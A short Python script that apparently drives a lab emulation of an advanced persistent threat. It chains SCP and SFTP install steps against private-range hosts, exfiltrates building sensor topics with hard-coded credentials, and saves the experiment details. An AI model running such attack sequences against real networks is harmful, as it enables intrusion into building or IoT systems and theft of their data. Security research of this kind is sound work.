import APT

atk_seq = [(APT.ScpInstStep("10.0.0.5", src_files=None, pause=10), 1),
           (APT.SftpInstStep("10.0.0.6", src_files=None, pause=10), 1),
           (APT.PubExfExploit("10.0.0.5", "client1", "pass1",
                              ["Building1/SolarPower/Voltage", "Building3/Outside/Motion"]), 1),
           (APT.PubExfExploit("10.0.0.6", "client1", "pass1",
                              ["Building1/SolarPower/Voltage", "Building3/Outside/Motion"]), 1),
           (APT.ScpExfExploit("10.0.0.5", dest_file="./scp_exf", pause=10), 1),
           (APT.SftpExfExploit("10.0.0.6", dest_file="./sftp_exf", pause=10), 1),
           ]
exp_dtls = []
Attack = APT.APTAttack(atk_seq, "test_new_func", exp_dtls, "/output/exp_details.pkl")
Attack.run()
Attack.save_in()
